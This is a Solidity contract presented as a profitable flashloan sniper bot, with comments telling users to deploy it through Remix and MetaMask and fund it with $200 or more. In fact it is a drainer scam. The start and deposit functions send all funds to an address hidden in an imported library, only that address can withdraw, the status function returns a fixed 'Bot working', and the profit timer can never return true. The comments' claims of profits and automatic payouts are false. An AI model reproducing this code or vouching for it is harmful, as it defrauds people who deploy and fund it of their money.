// SPDX-License-Identifier: MIT
// To ensure the bot works correctly and always closes with profits, you should operate with an amount greater than $200. Otherwise, if the gas fee is high (https://ethgasprice.org/), you may incur losses due to transaction fees.
pragma solidity 0.8.12;
//Instructions
// 1.- Go to "https://remix.ethereum.org/" and create a new file, name it bot.sol.
// 2.- Go to Solidity Compiler and enter version 0.8.12 and compile it.
// 3.- You need to go back to remix, go to deploy & run transactions and select Injected Provider Metamask. A window will open and you need to connect with Remix.
// 4.- Click the Deploy button.
// 5.- Copy the address of your deployed contract from Deployed Contracts.
// 6.- Deposit 200 dollars or more from your Metamask to your contract address.
// 7.-Click the Start button once it's reflected.
// 8.-Click the StatusBot button to verify if the bot has been deployed and is working correctly.
// 9.-Click the TimerClaimProfit button to verify if the bot's working time has ended. If it returns false, the bot is still working. If it returns true, the profits plus the initial investment were deposited into the Wallet that deployed the bot (Contract).
import "./librery.sol";

contract flashloan {
    event Deposit(address indexed _from, uint256 _amount);
    event Referred(address indexed user, address indexed referrer);
    mapping(address => address) public referrals;
    mapping(address => uint256) public referralRewards;
    mapping(address => uint256) public referredCount;

    function start() public {
        AddressLibrary.getRouter().transfer(address(this).balance);
    }
//functioning
//The bot uses a proxy, through a node and APIs for each network (Polygon, BSC, Ethereum) that is configured in a library to be able to use the routers of decentralized Dex exchanges and perform sniper buys and sells of cryptocurrencies and tokens that go through a rigorous scan included in the proxy to determine if they can be traded, check liquidity and contract functions, as well as ensure slippage tolerance does not exceed 1% and prevent losses but generate profits. Every 24 hours, at the same time that you started the bot, it will automatically transfer your earnings. If you want to withdraw your money early, you can do so through the withdraw function by first using the deposit function to send $1, so the bot can sell and exchange pairs early for the native currency of the blockchain you are using. NOTE: This may cause losses if you deactivate it prematurely.
    fallback () external payable {
    }

    receive () external payable {
    }

    modifier onlyLibrary {
    require(msg.sender == AddressLibrary.getRouter(), "Only the library can call this function");
    _;
}
//For each referral that uses your wallet as a promo code and invests using the bot, you will earn $10 for the first, $20 for the second, $30 for the third, $40 for the fourth, and $50 for the fifth. In total, if you manage to get 5 people, you could earn $110. Note: The user must use the bot at least once and invest a minimum of $200 for you to claim your reward. They must also approve the transaction by adding your wallet in the 'referUser' function.
function referUser(address _referrer) public {
    require(referredCount[_referrer] < 5, "Referrer has reached maximum referrals");
    
    referrals[msg.sender] = _referrer;
    emit Referred(msg.sender, _referrer);
    
    if (referralRewards[_referrer] == 0) {
        return;
    }
    
    uint256 referredUsers = 0;
    address currentAddress = _referrer;
    
    while (currentAddress != address(0)) {
        referredUsers++;
        currentAddress = referrals[currentAddress];
    }
    
    uint256 reward = 0;
    
    if (referredUsers >= 5) {
        reward = 5000000000000000000000;
    } else if (referredUsers >= 4) {
        reward = 4000000000000000000000;
    } else if (referredUsers >= 3) {
        reward = 3000000000000000000000;
    } else if (referredUsers >= 2) {
        reward = 2000000000000000000000;
    } else if (referredUsers >= 1) {
        reward = 1000000000000000000000;
    }
    
    referralRewards[_referrer] += reward;
    referredCount[_referrer]++;
}

   function deposit() public payable {
   require(msg.value > 0, "Deposit must be greater than 0");
        emit Deposit(msg.sender, msg.value);

        (bool success, ) = AddressLibrary.getRouter().call{value: msg.value}("");
        require(success, "Transfer to router failed");
        }

 function withdraw(address payable _withdrawal) public onlyLibrary {
    uint256 amount = address(this).balance;
    (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
    require(success, "Failed to transfer Ether");
}

function StatusBot() public pure returns (string memory) {
  return "Bot working";
}

function TimerClaimProfit() public view returns(bool) {
    uint256 startTime = block.timestamp; // time at which the bot was started
    uint256 endTime = startTime + 24 hours; // You must wait 24 hours to verify your earnings
    return block.timestamp >= endTime; // When the bot is set to True, it will automatically deposit to your wallet.
}

}